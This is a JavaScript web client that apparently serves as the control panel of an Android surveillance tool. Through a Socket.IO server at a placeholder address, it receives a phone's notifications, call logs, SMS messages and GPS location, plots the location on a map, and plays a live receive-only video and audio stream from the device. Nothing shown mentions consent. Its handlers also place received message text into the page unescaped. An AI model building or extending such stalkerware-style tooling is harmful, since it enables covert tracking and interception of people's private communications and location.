const socket = io('http://<Your Server IP Address>:3000', {
  reconnection: true,
  reconnectionAttempts: 15,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  randomizationFactor: 0.5
});
const videoEl = document.getElementById('remoteVideo');
const statusDiv = document.getElementById('status');
const notificationsDiv = document.getElementById('notifications');
const callLogsDiv = document.getElementById('callLogs');
const smsDiv = document.getElementById('smsMessages');
const debugLog = document.getElementById('debugLog');
const retryButton = document.getElementById('retryButton');
let peer;
let myId;
let androidClientId;
let map;
let marker;

const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
  ]
};

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
  logDebug(message);
  retryButton.style.display = message.includes('Failed') ? 'block' : 'none';
}

function logDebug(message) {
  const logEntry = document.createElement('div');
  logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
  debugLog.prepend(logEntry);
  while (debugLog.children.length > 50) {
    debugLog.removeChild(debugLog.lastChild);
  }
}

function addNotification(notification) {
  const notificationEl = document.createElement('div');
  notificationEl.className = 'notification';
  notificationEl.innerHTML = `
    <p><strong>App:</strong> ${notification.appName}</p>
    <p><strong>Title:</strong> ${notification.title}</p>
    <p><strong>Text:</strong> ${notification.text}</p>
    <p class="timestamp">${notification.timestamp}</p>
  `;
  notificationsDiv.prepend(notificationEl);
  while (notificationsDiv.children.length > 10) {
    notificationsDiv.removeChild(notificationsDiv.lastChild);
  }
  logDebug(`Received notification from ${notification.appName}`);
}

function addCallLog(call) {
  const callLogEl = document.createElement('div');
  callLogEl.className = 'call-log';
  callLogEl.innerHTML = `
    <p><strong>Number:</strong> ${call.number}</p>
    <p><strong>Type:</strong> ${call.type}</p>
    <p><strong>Date:</strong> ${call.date}</p>
    <p><strong>Duration:</strong> ${call.duration} seconds</p>
  `;
  callLogsDiv.prepend(callLogEl);
  while (callLogsDiv.children.length > 10) {
    callLogsDiv.removeChild(callLogsDiv.lastChild);
  }
  logDebug(`Received call log: ${call.number}`);
}

function addSmsMessage(sms) {
  const smsEl = document.createElement('div');
  smsEl.className = 'sms-message';
  smsEl.innerHTML = `
    <p><strong>Address:</strong> ${sms.address}</p>
    <p><strong>Type:</strong> ${sms.type}</p>
    <p><strong>Date:</strong> ${sms.date}</p>
    <p><strong>Body:</strong> ${sms.body}</p>
  `;
  smsDiv.prepend(smsEl);
  while (smsDiv.children.length > 50) {
    smsDiv.removeChild(smsDiv.lastChild);
  }
  logDebug(`Received SMS from ${sms.address}`);
}

function initMap() {
  map = L.map('mapContainer').setView([0, 0], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
  }).addTo(map);
}

function updateMap(latitude, longitude) {
  if (!map) {
    initMap();
  }
  if (marker) {
    marker.setLatLng([latitude, longitude]);
  } else {
    marker = L.marker([latitude, longitude]).addTo(map);
    marker.bindPopup('Device Location').openPopup();
  }
  map.setView([latitude, longitude], 13);
  logDebug(`Updated map to lat=${latitude}, lng=${longitude}`);
}

function reconnectSocket() {
  updateStatus('Attempting to reconnect to server...');
  socket.connect();
}

socket.on('connect', () => {
  updateStatus('Connected to signaling server');
});

socket.on('connect_error', (error) => {
  const message = `Socket.IO connection error: ${error.message} (${error.type})`;
  console.error(message);
  updateStatus('Failed to connect to server. Retrying...');
});

socket.on('id', id => {
  myId = id;
  logDebug(`Received socket ID: ${myId}`);
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
  updateStatus('Announced readiness to receive stream');
});

socket.on('android-client-ready', id => {
  if (androidClientId !== id) {
    androidClientId = id;
    logDebug(`Android client ready: ${id}`);
    updateStatus('Android client connected');
  }
});

socket.on('notification', data => {
  logDebug(`Received notification from ${data.from}`);
  if (data.notification) {
    addNotification(data.notification);
  }
});

socket.on('call_log', data => {
  logDebug(`Received call log from ${data.from}`);
  if (data.call_logs) {
    data.call_logs.forEach(call => addCallLog(call));
  }
});

socket.on('sms', data => {
  logDebug(`Received SMS messages from ${data.from}`);
  if (data.sms_messages) {
    data.sms_messages.forEach(sms => addSmsMessage(sms));
  }
});

socket.on('location', data => {
  logDebug(`Received location from ${data.from}: lat=${data.latitude}, lng=${data.longitude}`);
  updateMap(data.latitude, data.longitude);
});

socket.on('signal', async (data) => {
  logDebug(`Received signal from ${data.from}: ${data.signal.type || 'candidate'}`);
  const { from, signal } = data;

  if (!peer) {
    logDebug('Creating new peer connection');
    try {
      peer = new RTCPeerConnection(config);
      peer.addTransceiver('video', { direction: 'recvonly' });
      peer.addTransceiver('audio', { direction: 'recvonly' });

      peer.ontrack = ({ streams }) => {
        const remoteStream = streams[0];
        logDebug('Assigned remote stream to video element');
        videoEl.srcObject = remoteStream;

        videoEl.onloadedmetadata = () => {
          videoEl.play().catch(err => {
            console.error('Autoplay blocked:', err);
            updateStatus('Tap the video to start playback');
            videoEl.setAttribute('controls', 'true');
          });
        };

        updateStatus('Receiving remote stream');
      };

      peer.onicecandidate = e => {
        if (e.candidate) {
          logDebug(`Sending ICE candidate: ${e.candidate.sdpMid}`);
          socket.emit('signal', {
            to: from,
            from: myId,
            signal: { candidate: e.candidate }
          });
        }
      };

      peer.oniceconnectionstatechange = () => {
        logDebug(`ICE connection state: ${peer.iceConnectionState}`);
        updateStatus(`ICE connection: ${peer.iceConnectionState}`);
        if (peer.iceConnectionState === 'failed') {
          updateStatus('Connection failed, please refresh or retry');
        }
      };

      peer.onsignalingstatechange = () => {
        logDebug(`Signaling state: ${peer.signalingState}`);
      };
    } catch (err) {
      console.error('Failed to create peer connection:', err);
      updateStatus(`Peer connection error: ${err.message}`);
    }
  }

  try {
    if (signal.type === 'offer') {
      logDebug(`Processing offer from Android, SDP: ${signal.sdp.substring(0, 50)}...`);
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      logDebug(`Created answer, SDP: ${answer.sdp.substring(0, 50)}...`);
      await peer.setLocalDescription(answer);
      logDebug('Sending answer back to Android');
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal.candidate) {
      logDebug(`Adding ICE candidate: ${signal.candidate.candidate}`);
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Error handling signal:', err);
    updateStatus(`Error: ${err.message}`);
  }
});

socket.on('android-client-disconnected', () => {
  updateStatus('Android client disconnected');
  if (peer) {
    peer.close();
    peer = null;
    videoEl.srcObject = null;
    document.body.style.backgroundColor = '#111827';
  }
  notificationsDiv.innerHTML = '';
  callLogsDiv.innerHTML = '';
  smsDiv.innerHTML = '';
  if (marker) {
    marker.remove();
    marker = null;
  }
  logDebug('Android client disconnected');
});

socket.on('error', (error) => {
  console.error('Socket.IO server error:', error);
  updateStatus(`Server error: ${error.message}`);
});

retryButton.addEventListener('click', reconnectSocket);

updateStatus('Connecting to server...');
logDebug('Web client initializing...');
initMap();